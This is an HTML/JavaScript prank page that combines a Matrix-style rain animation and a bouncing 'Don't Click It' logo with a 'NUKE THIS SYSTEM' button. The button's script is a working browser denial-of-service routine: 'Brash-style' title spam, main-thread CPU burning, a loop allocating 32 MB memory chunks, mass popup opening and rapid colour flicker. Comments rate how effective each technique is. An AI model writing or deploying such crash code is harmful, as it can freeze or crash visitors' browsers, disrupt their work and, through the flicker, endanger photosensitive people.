<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Matrix + Don't Click It</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            background: black;
            color: #0f0;
            font-family: monospace;
            user-select: none;
            height: 100vh;
        }
        canvas {
            display: block;
            position: fixed;
            inset: 0;
        }
        #logo-container {
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
            pointer-events: none;
            z-index: 10;
            text-align: center;
            transition: transform 0.4s ease;
        }
        #logo {
            pointer-events: auto;
            cursor: pointer;
            image-rendering: pixelated;
            width:  min(260px, 55vw);
            max-width: 260px;
        }
        #nuke-button {
            margin-top: 16px;
            padding: 12px 32px;
            background: #c00;
            color: white;
            font-size: 1.2rem;
            font-weight: bold;
            border: 3px solid #fff;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.25s;
            pointer-events: auto;
            display: none;
        }
        #nuke-button:hover {
            background: #f00;
            transform: scale(1.08);
            box-shadow: 0 0 30px #f00;
        }
        #crash-overlay {
            position: fixed;
            inset: 0;
            background: rgba(200,0,0,0.92);
            color: white;
            font-size: clamp(2.8rem, 7vw, 6rem);
            font-weight: bold;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            text-align: center;
            z-index: 9999;
            pointer-events: none;
            opacity: 0;
            transition: opacity 0.4s;
        }
        #crash-gif {
            width:  min(80vmin, 640px);
            height: auto;
            margin-bottom: 24px;
            border: 6px solid #fff;
            box-shadow: 0 0 50px #f22, 0 0 100px #f00;
            animation: pulse 1.8s infinite alternate;
        }
        @keyframes pulse {
            0%   { transform: scale(1.0)   rotate(0deg);   filter: brightness(1); }
            100% { transform: scale(1.15) rotate(3deg);   filter: brightness(1.6) contrast(1.3); }
        }
        .warning {
            font-size: clamp(1.4rem, 4vw, 2.4rem);
            color: #ff0;
            text-shadow: 0 0 12px #ff0;
            margin-top: 16px;
            animation: blink 1.2s infinite alternate;
        }
        @keyframes blink {
            from { opacity: 0.6; }
            to   { opacity: 1.0; }
        }
    </style>
</head>
<body>
    <canvas id="matrix"></canvas>

    <div id="logo-container">
        <img id="logo" src="https://dontclickit.org/wp-content/uploads/2024/05/cropped-dont-click-it-logo-1-330x109.png" alt="Don't Click It">
        <button id="nuke-button">NUKE THIS SYSTEM</button>
    </div>

    <div id="crash-overlay">
        <img id="crash-gif" src="https://cache.magicmaman.com/data/fichiers/48/bombenucleaire.gif" alt="BOOM">
        <div id="status">PREPARING DESTRUCTION SEQUENCE...</div>
        <div class="warning">WARNING: THIS WILL CRASH YOUR BROWSER</div>
    </div>

    <script>
        // ─── Matrix Rain ────────────────────────────────────────
        const canvas = document.getElementById('matrix');
        const ctx = canvas.getContext('2d');
        let columns, drops;

        function resizeMatrix() {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            const fontSize = 16;
            columns = Math.floor(canvas.width / fontSize);
            drops = new Array(columns).fill(1);
        }

        function drawMatrix() {
            ctx.fillStyle = 'rgba(0,0,0,0.06)';
            ctx.fillRect(0, 0, canvas.width, canvas.height);

            ctx.fillStyle = '#0f0';
            ctx.font = '16px monospace';

            const chars = "アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲンABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

            for (let i = 0; i < columns; i++) {
                const txt = chars[Math.floor(Math.random() * chars.length)];
                const x = i * 16;
                const y = drops[i] * 16;
                ctx.fillText(txt, x, y);

                if (y > canvas.height && Math.random() > 0.975) {
                    drops[i] = 0;
                }
                drops[i]++;
            }
        }

        resizeMatrix();
        window.addEventListener('resize', resizeMatrix);
        setInterval(drawMatrix, 45);

        // ─── Bouncing Logo ──────────────────────────────────────
        const logoContainer = document.getElementById('logo-container');
        let logoX = window.innerWidth * 0.5 - 130;
        let logoY = window.innerHeight * 0.5 - 70;
        let vx = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.2);
        let vy = (Math.random() > 0.5 ? 1 : -1) * (1.8 + Math.random() * 1.2);

        function animateLogo() {
            const w = logoContainer.offsetWidth  || 260;
            const h = logoContainer.offsetHeight || 140;

            logoX += vx;
            logoY += vy;

            if (logoX <= 0 || logoX + w >= window.innerWidth)  vx = -vx;
            if (logoY <= 0 || logoY + h >= window.innerHeight) vy = -vy;

            logoContainer.style.left = logoX + 'px';
            logoContainer.style.top  = logoY + 'px';

            requestAnimationFrame(animateLogo);
        }
        animateLogo();

        // ─── Crash Logic ────────────────────────────────────────
        const overlay  = document.getElementById('crash-overlay');
        const status   = document.getElementById('status');
        const nukeBtn  = document.getElementById('nuke-button');
        const logo     = document.getElementById('logo');

        logo.addEventListener('click', () => {
            nukeBtn.style.display = 'inline-block';
            logo.style.pointerEvents = 'none';
            logo.style.cursor = 'default';

            overlay.style.opacity = '0.7';
            setTimeout(() => { overlay.style.opacity = '0'; }, 1800);
        });

        nukeBtn.addEventListener('click', () => {
            nukeBtn.disabled = true;
            nukeBtn.style.display = 'none';
            overlay.style.opacity = '1';

            let dots = 0;
            const dotInterval = setInterval(() => {
                dots = (dots + 1) % 4;
                status.textContent = "PREPARING SYSTEM DESTRUCTION" + ".".repeat(dots);
            }, 400);

            setTimeout(() => {
                clearInterval(dotInterval);
                status.textContent = "EXECUTING DESTRUCTION...";

                // ─── Brash-style title spam (most effective part) ───
                let counter = 0;
                function titleSpam() {
                    document.title = Math.random().toString(36).repeat(12) + " ☠ " + counter;
                    counter++;
                    if (counter < 80000) requestAnimationFrame(titleSpam);
                }
                titleSpam();

                // Heavy math in main thread
                function cpuBurn() {
                    let x = 0;
                    for (let i = 0; i < 4e7; i++) {
                        x += Math.sin(Date.now() * Math.random());
                    }
                    if (counter < 60000) setTimeout(cpuBurn, 0);
                }
                setTimeout(cpuBurn, 400);

                // Memory pressure (modern browsers limit this quite a bit)
                const leak = [];
                function eatMemory() {
                    try {
                        leak.push(new Uint8Array(32 * 1024 * 1024)); // ~32 MB chunks
                    } catch {}
                    setTimeout(eatMemory, 80);
                }
                setTimeout(eatMemory, 800);

                // Try opening tabs (will be popup-blocked in most cases)
                setTimeout(() => {
                    for (let i = 0; i < 15; i++) {
                        window.open('about:blank', '_blank');
                    }
                }, 1200);

                // Random background flicker
                setInterval(() => {
                    document.body.style.background = `hsl(${Math.random()*360}, 80%, 20%)`;
                }, 180);

            }, 2800);
        });
    </script>
</body>
</html>
